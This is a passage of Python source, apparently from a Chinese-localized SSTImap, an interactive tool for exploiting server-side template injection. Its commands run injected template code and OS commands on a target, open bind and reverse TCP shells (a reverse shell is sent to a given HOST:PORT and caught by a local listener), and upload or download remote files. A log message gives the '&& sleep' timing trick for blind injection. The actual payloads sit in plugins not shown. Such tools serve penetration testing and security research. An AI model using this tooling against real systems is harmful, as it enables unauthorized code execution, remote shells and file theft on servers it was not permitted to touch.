            log.log(23, '只发现了盲目执行。无论代码计算结果是否为真值，都会返回 True 或 False。')
            log.log(21, '注入多行模板基础语言代码。按 ctrl-D 或在新行上键入“EOF”以发送行')
            try:
                MultilineShell(self.current_plugin.evaluate_blind, f"{self.channel.data.get('language', '')} > ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, '退出模板基础语言 shell')
        elif self.channel.data.get('evaluate'):
            log.log(21, '注入多行模板基础语言代码。按 ctrl-D 或在新行上键入“EOF”以发送行')
            try:
                MultilineShell(self.current_plugin.evaluate, f"{self.channel.data.get('language', '')} > ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, '退出模板基础语言 shell')
        else:
            log.log(22, '目标上未检测到语言代码评估功能')

    do_eval = do_eval_shell

    def do_eval_code(self, line):
        '评估单个模板命令'
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        if line == '':
            log.log(22, '语言命令不能为空。')
            return
        if self.channel.data.get('evaluate_blind'):
            log.log(23, '只发现了盲目执行。无论代码计算结果是否为真值，都会返回 True 或 False。')
            try:
                print(self.current_plugin.evaluate_blind(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, '退出语言命令执行')
        elif self.channel.data.get('evaluate'):
            try:
                print(self.current_plugin.evaluate(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, '退出语言命令执行')
        else:
            log.log(22, '目标上未检测到代码评估功能')

    def do_os_shell(self, line):
        '提供交互式操作系统外壳'
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        if self.channel.data.get('execute_blind'):
            log.log(23, '已经发现盲注入，命令执行不会产生任何输出。')
            if self.channel.data.get('boolean'):
                log.log(26, '无论命令成功与否，都会返回 True 或 False。')
            else:
                log.log(26, '通过将“&& sleep <delay>”附加到 shell 命令来引入延迟。无论返回成功与否，都返回True或False。')
            log.log(21, '在操作系统上运行命令。')
            try:
                Shell(self.current_plugin.execute_blind, f"{self.channel.data.get('os', 'undetected')} (blind) $ ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, '退出操作系统外壳')
        elif self.channel.data.get('execute'):
            log.log(21, '在操作系统上运行命令。')
            try:
                Shell(self.current_plugin.execute, f"{self.channel.data.get('os', 'undetected')} $ ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, '退出操作系统外壳')
        else:
            log.log(22, '在目标上未检测到系统命令执行能力。')

    do_shell = do_os_shell
    do_os = do_os_shell

    def do_os_cmd(self, line):
        '执行单个操作系统命令'
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        if line == '':
            log.log(22, '操作系统命令不能为空。')
            return
        if self.channel.data.get('execute_blind'):
            log.log(23, '已经发现盲注入，命令执行不会产生任何输出。')
            if self.channel.data.get('boolean'):
                log.log(26, '无论命令成功与否，都会返回 True 或 False。')
            else:
                log.log(26, '通过将“&& sleep <delay>”附加到 shell 命令来引入延迟。无论返回成功与否，都返回True或False。')
            try:
                print(self.current_plugin.execute_blind(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, '退出操作系统命令执行')
        elif self.channel.data.get('execute'):
            try:
                print(self.current_plugin.execute(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, '退出操作系统命令执行')
        else:
            log.log(22, '在目标上未检测到系统命令执行能力。')

    def do_bind_shell(self, line):
        """Create bind shell on PORT"""
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        if line == '' or not line.isnumeric():
            log.log(22, '为绑定 shell 提供的端口无效。')
            return
        port = int(line)
        if self.channel.data.get('bind_shell'):
            url = parse.urlparse(self.channel.base_url)
            if not url.hostname:
                log.log(22, '解析主机名时出错')
                return
            for idx, thread in enumerate(self.current_plugin.bind_shell(port, shell=self.channel.args.get('remote_shell'))):
                log.log(26, f'在远程端口上生成 shell {port} 带载荷 {idx+1}')
                thread.join(timeout=1)
                if thread.is_alive():
                    log.log(24, f'带有载荷的外壳 {idx+1} 看起来很稳定')
                    break
            try:
                a = TcpClient(url.hostname, port, timeout=5)
                a.shell()
                return
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, '退出绑定 shell')
            except Exception as e:
                log.log(25, f"连接到时出错 {url.hostname}:{port} {e}")
        else:
            log.log(22, '目标上未检测到 TCP shell 打开功能')

    def do_reverse_shell(self, line):
        '发送反向shell到HOST:PORT'
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        dest = line.split(" ")
        if len(dest) != 2 or '' in dest:
            log.log(22, '您必须为反向 shell 提供 HOST 和 PORT。')
            return
        host, port = dest
        if not port.isnumeric():
            log.log(22, '为反向 shell 提供的端口无效。')
            return
        timeout = 15
        if self.channel.data.get('reverse_shell'):
            self.current_plugin.reverse_shell(host, port, shell=self.channel.args.get('remote_shell'))
            try:
                TcpServer(int(port), timeout)
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, '退出反向 shell')
            except socket.timeout:
                log.log(22, f"之后没有传入的 TCP shell {timeout}s, quitting.")
        else:
            log.log(22, '目标上未检测到反向 TCP shell 功能')

    do_bind = do_bind_shell
    do_reverse = do_reverse_shell

    def do_force_overwrite(self, line):
        '切换force_overwrite选项'
        overwrite = not self.sstimap_options["force_overwrite"]
        log.log(24, f'{"En" if overwrite else "Dis"}能够强制覆盖文件')
        self.sstimap_options["force_overwrite"] = overwrite

    do_overwrite = do_force_overwrite

    def do_upload(self, line):
        '将本地文件上传到远程文件'
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        paths = line.split(" ")
        if len(paths) != 2 or '' in paths:
            log.log(22, '您必须提供本地和远程上传路径。')
            return
        if self.channel.data.get('write'):
            local_path, remote_path = paths
            try:
                with open(local_path, 'rb') as f:
                    data = f.read()
                self.current_plugin.write(data, remote_path)
            except FileNotFoundError:
                log.log(25, f'未找到本地文件： {local_path}')
            except (KeyboardInterrupt, EOFError):
                log.log(26, '退出文件上传')
        else:
            log.log(22, '目标上未检测到文件上传功能')

    def do_download(self, line):
        '下载远程文件到本地文件'
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        paths = line.split(" ")
        if len(paths) != 2 or '' in paths:
            log.log(22, '您必须提供用于下载的 REMOTE 和 LOCAL 路径。')
            return
        if self.channel.data.get('read'):
            remote_path, local_path = paths
            try:
                content = self.current_plugin.read(remote_path)
                with open(local_path, 'wb') as f:
                    f.write(content)
            except (KeyboardInterrupt, EOFError):
                log.log(26, '退出文件下载')
        else:
            log.log(22, '目标上未检测到文件下载功能')

    do_up = do_upload
    do_down = do_download

# SSTI 映射命令

    def do_reload_modules(self, line):
        '重新加载所有模块'
        from core.plugin import unload_plugins, load_plugins,  loaded_plugins
        from core.data_type import unload_data_types, load_data_types,  loaded_data_types_by_categories
        unload_plugins()
        unload_data_types()
        load_plugins()
        load_data_types()
        log.log(26, f"按类别重新加载插件： {'; '.join([f'{x}: {len(loaded_plugins[x])}' for x in loaded_plugins])}")
        log.log(26, f"按类别重新加载请求正文类型： {'; '.join([f'{x}: {len(loaded_data_types_by_categories[x])}' for x in loaded_data_types_by_categories])}")

    do_reload = do_reload_modules
